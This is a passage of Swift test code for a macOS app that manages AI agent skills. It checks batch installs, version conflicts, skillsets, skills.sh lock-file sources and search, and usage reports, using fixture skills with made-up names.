    guard case .conflict(let conflict) = results[1].outcome else { throw CheckFailure.failed("batch conflict result") }
    guard case .failed(let changedMessage) = results[2].outcome else { throw CheckFailure.failed("changed source result") }
    try check(changedMessage.contains("contents changed"), "changed supporting bytes block reviewed addition")
    try check(!results[3].outcome.completed, "built-in source cannot be added to another tool")
    let keptBytes = try Data(contentsOf: existingFile)
    try check(keptBytes == existingBytes, "batch preserves existing different content even when skill is broadly available")
    try check(store.pendingReviewedAdd == nil && store.addConflict == nil, "batch results leave single-add modal state untouched")
    let kept = SkillAddResult(request: conflictRequest, outcome: .kept(existing))
    try check(kept.outcome.completed && !kept.outcome.becameAvailable, "keeping an installation resolves a row without claiming selected-source availability")
    let again = await store.addReviewed([addRequest])
    guard case .available = again[0].outcome else { throw CheckFailure.failed("exact-source repeat result") }
    try "changed independently\n".write(to: existingFile, atomically: true, encoding: .utf8)
    let replacement = await store.replaceReviewed(conflictRequest, conflict: conflict)
    let changedDestinationText = try String(contentsOf: existingFile, encoding: .utf8)
    try check(!replacement.outcome.completed && changedDestinationText == "changed independently\n",
      "changed destination refuses replacement and preserves current contents")

    let draftName = prefix + "-library-draft"
    var draft = Suggestion(name: draftName, title: "Made-up saved idea", summary: "A fixture", why: "For usability checks", examples: [], createdAt: Date())
    draft.draft = "---\nname: \(draftName)\ndescription: A made-up idea\n---\n# Saved draft\n"
    store.suggestions.append(draft)
    await store.save(draft.id, to: .library)
    let saved = store.suggestion(draft.id)!
    try check(saved.savedSkillID == draftName && store.savedSkill(for: saved)?.isLibraryOnly == true
      && store.savedSkill(for: saved)?.isInstalledInAnyTool == false && store.savedSkill(for: saved)?.isOutsideLibrary == false,
      "Library-only draft preserves saved identity without tool availability")
    let editableDraft = try SkillInstaller.edit(store.savedSkill(for: saved)!)
    try check(editableDraft.original.contains("# Saved draft"), "Library-only drafts remain editable without modifying repositories")
    let renamedDraft = prefix + "-renamed"
    await store.rename(store.savedSkill(for: saved)!, to: renamedDraft)
    try check(store.savedSkill(for: saved)?.id == renamedDraft, "saved draft follows rename aliases")

    let partialName = prefix + "-partial-draft"
    try writeSkill(Tool.amp.skillsFolder.appending(path: partialName), name: partialName)
    var partial = Suggestion(name: partialName, title: "Partial fixture", summary: "", why: "", examples: [], createdAt: Date())
    partial.draft = "---\nname: \(partialName)\ndescription: Saved despite an existing copy\n---\n# New draft\n"
    store.suggestions.append(partial)
    await store.save(partial.id, to: .everywhere([.amp]))
    let partialSaved = store.suggestion(partial.id)!
    try check(partialSaved.savedTo != nil && partialSaved.savedSkillID == partialName
      && !(store.suggestionSaveIssues[partial.id] ?? []).isEmpty,
      "partial linking retains saved draft identity and reports the failed tool")
    try check(store.savedSkill(for: partialSaved)?.availableIn.contains(.codex) == true,
      "shared draft storage reports actual shared-folder readers")

    let allPromptIDs = store.prompts.map(\.id)
    store.setUsageScope(UsageScope(project: home.appending(path: "not-recorded").path, days: 7))
    try check(store.usage.isEmpty && store.prompts.map(\.id) == allPromptIDs,
      "usage scope filters recorded events without changing AI prompt inputs")
    store.setUsageScope(UsageScope(days: store.loadedLookbackDays))
    try check(store.usageScope.days == nil, "period equal to loaded horizon normalizes to all loaded history")
    store.setUsageScope(UsageScope())

    let pluginSkillName = prefix + "-same-plugin-skill"
    var pluginFolders: [URL] = []
    for label in ["first", "second"] {
      let folder = home.appending(path: ".codex/plugins/cache/fixture/\(label)/1")
      pluginFolders.append(folder)
      try fm.createDirectory(at: folder.appending(path: ".codex-plugin"), withIntermediateDirectories: true)
      try "{\"name\":\"\(label)\",\"version\":\"1\"}".write(to: folder.appending(path: ".codex-plugin/plugin.json"), atomically: true, encoding: .utf8)
      try writeSkill(folder.appending(path: "skills/\(pluginSkillName)"), name: pluginSkillName)
      let skillFile = folder.appending(path: "skills/\(pluginSkillName)/SKILL.md")
      let original = try String(contentsOf: skillFile, encoding: .utf8)
      try (original + "\n\(label) source content\n").write(to: skillFile, atomically: true, encoding: .utf8)
    }
    await store.refreshSkills()
    let secondPlugin = store.plugins.first { $0.tool == .codex && $0.name == "second" }!
    let match = secondPlugin.skillCopy(named: pluginSkillName, among: store.skills)!
    let selectedPluginText = try SkillContents.read("SKILL.md", from: match.copy.resolved)
    try check(match.copy.resolved.path.hasPrefix(pluginFolders[1].path + "/")
      && selectedPluginText.contains("second source content"),
      "same-name plugin navigation selects and reads its own copy")
    let recoverySet = Skillset(name: "Made-up recovery", skills: [conflictName, prefix + "-missing-source"])
    store.skillsets.append(recoverySet)
    let receiptsBeforePreview = store.skillsetEntries
    let recoveryPlan = store.skillsetPreview(recoverySet, to: .amp, assigned: true)
    try check(recoveryPlan.issueDetails.contains { if case .missingSource = $0.reason { true } else { false } }
      && store.skillsetEntries == receiptsBeforePreview,
      "typed missing-source recovery leaves ownership unchanged before applying")
    let versionedName = prefix + "-versioned"
    let versionsRepo = RepositoryLibrary.managedRoot.appending(path: prefix + "-versions")
    try writeSkill(versionsRepo.appending(path: "claude/\(versionedName)"), name: versionedName, tools: "[claude]")
    try writeSkill(versionsRepo.appending(path: "generic/\(versionedName)"), name: versionedName)
    await store.refreshSkills()
    guard let versioned = store.skill(versionedName) else { throw CheckFailure.failed("versioned fixture skill is missing") }
    let versionSet = Skillset(name: "Made-up versions", skills: [versionedName])
    store.skillsets.append(versionSet)
    let unchosen = store.skillsetPreview(versionSet, to: .amp, assigned: true)
    try check(unchosen.additions.isEmpty && unchosen.issueDetails.contains { if case .chooseVersions = $0.reason { true } else { false } },
      "a skillset member with versions asks which one each agent gets")
    guard let genericVersion = SkillVersions.versions(of: versioned).first(where: { $0[0].resolved.path.contains("/generic/") })?.first else {
      throw CheckFailure.failed("versioned fixture has no generic version")
    }
    try check(store.setAgentSources([.amp: genericVersion.resolved.path], skipped: [], for: versioned, tools: [.amp])
      && store.skillsetPreview(versionSet, to: .amp, assigned: true).additions.map(\.name) == [versionedName],
      "a saved per-agent version lets the skillset apply to that agent")
    guard let claudeVersion = SkillVersions.versions(of: versioned).first(where: { $0[0].resolved.path.contains("/claude/") })?.first else {
      throw CheckFailure.failed("versioned fixture has no Claude Code version")
    }
    try check(store.setAgentSources([.claude: claudeVersion.resolved.path, .amp: genericVersion.resolved.path],
      skipped: [.codex], for: versioned, tools: Tool.allCases), "per-agent versions and a skip save")
    let codexPlan = store.skillsetPreview(versionSet, to: .codex, assigned: true)
    try check(codexPlan.skipped == [versionedName] && codexPlan.additions.isEmpty && codexPlan.issues.isEmpty,
      "a skipped agent's plan reports the member as skipped, not as an issue")
    for tool in [Tool.claude, .cursor, .amp, .codex] { _ = await store.applySkillset(id: versionSet.id, to: tool) }
    await store.refreshSkills()
    func installedHash(_ tool: Tool) -> String? {
      let file = tool.skillsFolder.appending(path: SkillInstaller.slug(versionedName)).appending(path: "SKILL.md")
      return (try? String(contentsOf: file, encoding: .utf8)).map(shortHash)
    }
    let claudeHash = shortHash(try String(contentsOf: claudeVersion.resolved.appending(path: "SKILL.md"), encoding: .utf8))
    let genericHash = shortHash(try String(contentsOf: genericVersion.resolved.appending(path: "SKILL.md"), encoding: .utf8))
    try check(claudeHash != genericHash && installedHash(.claude) == claudeHash && installedHash(.amp) == genericHash
      && installedHash(.codex) == nil && [nil, claudeHash].contains(installedHash(.cursor)),
      "applying per-agent versions puts each agent's version in its folder and skips Codex")
    try check(!SkillVersions.conflicts(skills: store.skills, adding: [], removing: []).contains { $0.skillID == versionedName },
      "applying per-agent versions leaves no agent reading two versions")
    for tool in [Tool.claude, .cursor, .amp, .codex] { _ = await store.applySkillset(id: versionSet.id, to: tool, assigned: false) }
    _ = store.setAgentSources([:], skipped: [], for: versioned, tools: Tool.allCases)
    let duplicateName = prefix + "-duplicate"
    for (folder, tools) in [("\(duplicateName)-a", "[gemini]"), ("\(duplicateName)-b", "[gemini, amp]")] {
      try writeSkill(Tool.gemini.skillsFolder.appending(path: folder), name: duplicateName, tools: tools)
    }
    await store.refreshSkills()
    let duplicate = store.skill(duplicateName)
    let duplicatePlan = store.skillsetPreview(Skillset(name: "Made-up duplicate", skills: [duplicateName]), to: .gemini, assigned: true)
    try check(duplicate?.copies.filter { $0.root.url == Tool.gemini.skillsFolder }.count == 2
      && duplicatePlan.issueDetails.contains { if case .existingVersions(.gemini, let folders) = $0.reason { folders.count == 2 } else { false } },
      "two versions in one agent folder show as an existing conflict")
    let duplicateSet = Skillset(name: "Made-up duplicate", skills: [duplicateName])
    store.skillsets.append(duplicateSet)
    store.setUsageScope(UsageScope(project: store.usageProjects.first, days: 7))
    let emptyStore = AppStore()
    return [
      ("usability-fresh-library", AnyView(ContentView(sidebar: .library).environment(emptyStore))),
      ("usability-search-miss", AnyView(SkillListEmptyView(reason: .search))),
      ("usability-source-empty", AnyView(SkillListEmptyView(reason: .source))),
      ("usability-batch-preview", AnyView(SkillAddSheet(skillIDs: [addedName, conflictName, changedName], initialTool: .amp).environment(store))),
      ("usability-batch-results", AnyView(SkillAddSheet(skillIDs: [addedName, conflictName],
        initialSources: [addedName: addRequest.sourcePath, conflictName: conflictRequest.sourcePath],
        initialTool: .amp, initialResults: Array(results.prefix(2))).environment(store))),
      ("usability-contents-review", AnyView(SkillContentsSheet(source: changed.primary).environment(store))),
      ("usability-skillset-recovery", AnyView(SkillsetPreview(skillsetID: recoverySet.id, tool: .amp, assigned: true).environment(store))),
      ("usability-version-recovery", AnyView(SkillsetPreview(skillsetID: versionSet.id, tool: .codex, assigned: true).environment(store))),
      ("usability-version-picker", AnyView(SkillVersionPicker(skill: versioned).environment(store))),
      ("usability-existing-versions", AnyView(SkillsetPreview(skillsetID: duplicateSet.id, tool: .gemini, assigned: true).environment(store))),
      ("usability-saved-idea", AnyView(SuggestionDetail(suggestion: store.suggestion(draft.id)!).environment(store))),
      ("usability-plugin-copy", AnyView(SkillDetail(skill: match.skill, installationSource: match.copy, context: .plugin).environment(store))),
      ("usability-scoped-use", AnyView(ContentView(sidebar: .used).environment(store))),
    ]
  }
  /// A skill the skills.sh CLI installed shows its source, and that source opens in Discovery.
  @MainActor
  static func checkSkillsLock(_ store: AppStore, prefix: String) async throws -> [(String, AnyView)] {
    let name = prefix + "-from-skills-sh"
    try writeSkill(Paths.at(".agents/skills/\(name)"), name: name)
    let lock = SkillsLock.globalFile()
    try FileManager.default.createDirectory(at: lock.deletingLastPathComponent(), withIntermediateDirectories: true)
    try #"{"version":3,"skills":{"\#(name)":{"source":"made-up-owner/made-up-skills","sourceType":"github","sourceUrl":"https://github.com/made-up-owner/made-up-skills.git","skillPath":"skills/\#(name)/SKILL.md","skillFolderHash":"","installedAt":"2026-10-19T00:00:00.000Z","updatedAt":"2026-10-19T00:00:00.000Z"}}}"#
      .write(to: lock, atomically: true, encoding: .utf8)
    await store.refreshSkills()
    guard let skill = store.skill(name) else { throw CheckFailure.failed("skills.sh fixture skill is missing") }
    let entry = SkillsLock.entry(for: skill, in: store.skillsLock)
    try check(entry?.label == "made-up-owner/made-up-skills" && entry?.repositoryAddress == "https://github.com/made-up-owner/made-up-skills.git",
      "a skill installed by the skills.sh CLI shows its lock source")

    let shared = Removal.shared([skill], selectedCount: 1)
    try check(shared?.copies.isEmpty == false && shared!.copies.allSatisfy { $0.root.kind == .shared }
      && shared?.isShared == true && shared?.actionLabel == "Remove from Shared\u{2026}",
      "Shared removal moves only the copy in ~/.agents/skills and names its readers")
    let twin = prefix + "-shared-and-claude"
    try writeSkill(Paths.at(".agents/skills/\(twin)"), name: twin)
    try writeSkill(Paths.at(".claude/skills/\(twin)"), name: twin)
    await store.refreshSkills()
    guard let twinSkill = store.skill(twin) else { throw CheckFailure.failed("shared and Claude Code fixture is missing") }
    let sharedOnly = SkillListContext.globalShared.removal(for: [twinSkill], selectedCount: 1)
    try check(twinSkill.copies.count == 2 && sharedOnly?.copies.map(\.folder.standardizedFileURL.path) == [Paths.at(".agents/skills/\(twin)").standardizedFileURL.path],
      "removing from Shared leaves a skill's own Claude Code copy in place")
    try check(SkillListContext.global(.cursor).removal(for: [twinSkill], selectedCount: 1)?.copies.count == 2,
      "removing from Cursor still covers every folder Cursor reads")
    let unshared = store.skills.first { $0.isPersonal && !$0.copies.contains { $0.root.kind == .shared } }
    try check(unshared.map { Removal.shared([$0], selectedCount: 1) == nil } ?? true, "a skill outside the shared folder has no Shared removal")

    let catalogCount = CustomRegistry.shared.fetch().count
    let listed = try await store.discoveryEntry(for: "https://github.com/mattpocock/skills", description: "unused")
    try check(listed?.catalog?.repo == "https://github.com/mattpocock/skills" && CustomRegistry.shared.fetch().count == catalogCount,
      "a skills.sh source Discovery already lists opens without adding a custom source")
    let added = try await store.discoveryEntry(for: entry!.repositoryAddress!, description: "From skills.sh \u{00B7} made-up-owner/made-up-skills")
    try check(added?.description == "From skills.sh \u{00B7} made-up-owner/made-up-skills" && added?.installedFolder == nil
      && CustomRegistry.shared.fetch().count == catalogCount + 1,
      "a skills.sh source Discovery doesn't list is added as a custom source")
    let again = try await store.discoveryEntry(for: "https://github.com/made-up-owner/made-up-skills", description: "unused")
    try check(again?.id == added?.id && CustomRegistry.shared.fetch().count == catalogCount + 1,
      "opening the same skills.sh source again reuses its Discovery entry")

    let directoryScenes = try await checkSkillsDirectorySearch(store)
    let gitRepositories = store.repositories.filter(\.source.isGit)
    let scenes: [(String, AnyView)] = [
      ("skills-lock-detail", AnyView(SkillDetail(skill: skill, context: .global(.codex)).environment(\.openSourceInDiscovery) { _, _ in }.environment(store))),
      ("skills-lock-detail-light", AnyView(SkillDetail(skill: skill, context: .global(.codex)).environment(\.openSourceInDiscovery) { _, _ in }.environment(store))),
      ("shared-sidebar", AnyView(ContentView(sidebar: .globalShared, skill: skill.id).environment(store))),
      ("shared-sidebar-light", AnyView(ContentView(sidebar: .globalShared, skill: skill.id).environment(store))),
      ("shared-sidebar-narrow", AnyView(ContentView(sidebar: .globalShared).environment(store))),
      ("agent-sidebar-codex", AnyView(ContentView(sidebar: .global, globalTool: .codex).environment(store))),
      ("skills-sh-handoff", AnyView(NavigationStack { RepositoryList(repositories: gitRepositories, selection: .constant(nil), searchText: "skills", searchSkillsDirectory: {}) }.environment(store))),
      ("skills-sh-handoff-empty-narrow", AnyView(NavigationStack { RepositoryList(repositories: [], selection: .constant(nil), searchText: "swiftui", searchSkillsDirectory: {}) }.environment(store))),
    ] + directoryScenes
    try CustomRegistry.shared.remove(id: added!.catalog!.repo)
    await store.loadRegistry()
    return scenes
  }

  /// A submitted skills.sh search keeps skills.sh's order, replaces a search still running, says when it fails,
  /// and stays in the store while Discovery opens a result's repository.
  @MainActor
  static func checkSkillsDirectorySearch(_ store: AppStore) async throws -> [(String, AnyView)] {
    func result(_ source: String, _ skill: String, _ installs: Int?) -> SkillsDirectory.Result {
      try! JSONDecoder().decode(SkillsDirectory.Result.self, from: Data("""
        {"id":"\(source)/\(skill)","source":"\(source)","skillId":"\(skill)","name":"\(skill)"\(installs.map { ",\"installs\":\($0)" } ?? "")}
        """.utf8))
    }
    func settle(_ store: AppStore) async { await store.skillsDirectoryTask?.value }
    let fixture = [
      result("made-up-owner/made-up-skills", "made-up-review", 1_240),
      result("mattpocock/skills", "made-up-planning", 86_300),
      result("made-up-owner/made-up-skills", "made-up-release-notes", 312),
      result("made-up-owner/made-up-skills", "made-up-changelog", 1),
      result("made-up-host.example/team/skills", "made-up-unhosted", nil),
    ]
    store.skillsDirectorySearcher = { query in
      if query == "slow" { try await Task.sleep(for: .seconds(2)) }
      return fixture
    }
    store.searchSkillsDirectory("x")
    try check(store.skillsDirectorySearch.query.isEmpty && store.skillsDirectoryTask == nil, "a one-letter skills.sh search sends nothing")
    store.searchSkillsDirectory("slow")
    try check(store.skillsDirectorySearch.searching, "a skills.sh search shows that it's running")
    store.searchSkillsDirectory("  made up  ")
    try await Task.sleep(for: .milliseconds(100))
    await settle(store)
    try check(store.skillsDirectorySearch.query == "made up" && store.skillsDirectorySearch.results?.map(\.skillId) == fixture.map(\.skillId)
      && !store.skillsDirectorySearch.searching && store.skillsDirectorySearch.error == nil,
      "a newer skills.sh search replaces one still running and keeps skills.sh's order")
    try check(store.discoveryEntry(listing: fixture[1].repositoryAddress!) != nil && fixture[4].repositoryAddress == nil,
      "skills.sh results say which repositories Discovery lists and which aren't on GitHub")

    let failing = AppStore()
    failing.skillsDirectorySearcher = { _ in throw SkillsDirectory.Failure.status(503) }
    failing.searchSkillsDirectory("made up")
    await settle(failing)
    try check(failing.skillsDirectorySearch.results == nil && failing.skillsDirectorySearch.error?.contains("503") == true,
      "a failed skills.sh search says why and shows no results")
    let empty = AppStore()
    empty.skillsDirectorySearcher = { _ in [] }
    empty.searchSkillsDirectory("nothing here")
    await settle(empty)
    try check(empty.skillsDirectorySearch.results?.isEmpty == true, "a skills.sh search with no matches says so")

    let selected = fixture[0]
    let related = fixture.filter { $0.source == selected.source && $0.id != selected.id }
    let notListed = fixture[2]
    return [
      ("skills-sh-prompt", AnyView(ContentView(sidebar: .discovery, discoveryKind: .skillsDirectory).environment(AppStore()))),
      ("skills-sh-results", AnyView(ContentView(sidebar: .discovery, discoveryKind: .skillsDirectory).environment(store))),
      ("skills-sh-results-light", AnyView(ContentView(sidebar: .discovery, discoveryKind: .skillsDirectory).environment(store))),
      ("skills-sh-results-narrow", AnyView(ContentView(sidebar: .discovery, discoveryKind: .skillsDirectory).environment(store))),
      ("skills-sh-error", AnyView(ContentView(sidebar: .discovery, discoveryKind: .skillsDirectory).environment(failing))),
      ("skills-sh-empty", AnyView(ContentView(sidebar: .discovery, discoveryKind: .skillsDirectory).environment(empty))),
      ("skills-sh-detail", AnyView(SkillsDirectoryResultDetail(result: selected, related: related).environment(store))),
      ("skills-sh-detail-listed", AnyView(SkillsDirectoryResultDetail(result: fixture[1], related: []).environment(store))),
      ("skills-sh-detail-unhosted-light", AnyView(SkillsDirectoryResultDetail(result: fixture[4], related: []).environment(store))),
      ("skills-sh-detail-narrow", AnyView(SkillsDirectoryResultDetail(result: notListed,
        related: fixture.filter { $0.source == notListed.source && $0.id != notListed.id }).environment(store))),
    ]
  }

  @MainActor
  static func checkDiscoveryChoices() async throws {
    var selection = DiscoveryKind.git
    let menu = NSHostingMenu(rootView: DiscoveryKindChoices(selection: Binding(
      get: { selection }, set: { selection = $0 })))
    menu.update()
    try await Task.sleep(for: .milliseconds(150))
    menu.update()
    guard let local = menu.items.firstIndex(where: { $0.title == DiscoveryKind.local.shortTitle }),
          let git = menu.items.firstIndex(where: { $0.title == DiscoveryKind.git.shortTitle }) else {
      throw CheckFailure.failed("Native Discovery source choices are missing")
    }
    menu.performActionForItem(at: local)
    try check(selection == .local, "Native Discovery Local folders choice changes source kind")
    menu.performActionForItem(at: git)
    try check(selection == .git, "Native Discovery Git repositories choice changes source kind")
    guard let directory = menu.items.firstIndex(where: { $0.title == DiscoveryKind.skillsDirectory.shortTitle }) else {
      throw CheckFailure.failed("Native Discovery skills.sh choice is missing")
    }
    menu.performActionForItem(at: directory)
    try check(selection == .skillsDirectory, "Native Discovery skills.sh choice changes source kind")
  }

  @MainActor
  static func checkReports(_ store: AppStore, prefix: String) async throws -> [(String, AnyView)] {
    let originalScope = store.usageScope
    let report = store.usageReport(scope: UsageScope(days: 7))
    try check(store.usageScope == originalScope, "Report filters leave skill-list usage scope unchanged")
    try check(report.byTool.keys.allSatisfy { store.tools.contains($0) }, "Reports exclude disabled tools")
    let folder = Tool.amp.skillsFolder.appending(path: prefix + "-report-inspection")
    try writeSkill(folder, name: prefix + "-report-inspection")
    let text = "# Made-up report instructions\nอ่าน\nsudo echo fixture\n"
    try text.write(to: folder.appending(path: "SKILL.md"), atomically: true, encoding: .utf8)
    await store.refreshSkills()
    guard let fixture = store.skill(prefix + "-report-inspection") else { throw CheckFailure.failed("Report fixture was not scanned") }
    let values = await ReportInspector().inspect([fixture])
    try check(values.count == 1 && values[0].bytes == text.utf8.count && values[0].lines == 3,
      "Reports inspect actual instruction bytes and lines")
    try check(values[0].review?.findings.contains(where: \.highRisk) == true,
      "Report inspection preserves flagged commands")
    let missingFolder = folder.appending(path: "missing")
    let missingCopy = SkillCopy(folder: missingFolder, resolved: missingFolder, root: fixture.primary.root,
      pluginName: nil, isSymlink: false, contentHash: "missing", created: .distantPast)
    let missing = Skill(name: "missing-report-source", description: "", copies: [missingCopy])
    let unavailable = await ReportInspector().inspect([missing])
    try check(unavailable.first?.bytes == nil && unavailable.first?.unavailable != nil,
      "Report unavailable sources do not masquerade as zero-size instructions")
    let navigation = NSHostingMenu(rootView: ReportSkillAction(skill: fixture).environment(store))
    navigation.update()
    try await Task.sleep(for: .milliseconds(150))
    navigation.update()
    guard let openIndex = navigation.items.firstIndex(where: { $0.title == "Open skill" }) else { throw CheckFailure.failed("Native report skill action is missing") }
    navigation.performActionForItem(at: openIndex)
    try check(store.revealRequest == fixture.id, "Native report action requests the existing skill detail")
    store.revealRequest = nil
    let pair = SimilarPair(first: fixture.id, second: prefix, score: 0.5, sharedWords: ["fixture"])
    var compared: SimilarPair.ID?
    let compare = NSHostingMenu(rootView: ReportSimilarAction(pair: pair, open: { compared = $0.id }))
    compare.update()
    try await Task.sleep(for: .milliseconds(150))
    compare.update()
    guard let index = compare.items.firstIndex(where: { $0.title == "Compare skills" }) else { throw CheckFailure.failed("Native report compare action is missing") }
    compare.performActionForItem(at: index)
    try check(compared == pair.id, "Native report comparison opens its selected similar pair")
    let empty = AppStore()
    return [
      ("dashboard", AnyView(ContentView().environment(store))),
      ("dashboard-light", AnyView(ContentView(sidebar: .dashboard).environment(store))),
      ("dashboard-narrow", AnyView(ContentView(sidebar: .dashboard).environment(store))),
      ("dashboard-library", AnyView(ContentView(sidebar: .dashboard).environment(store))),
      ("dashboard-empty", AnyView(ContentView(sidebar: .dashboard).environment(empty))),
    ]
  }

}
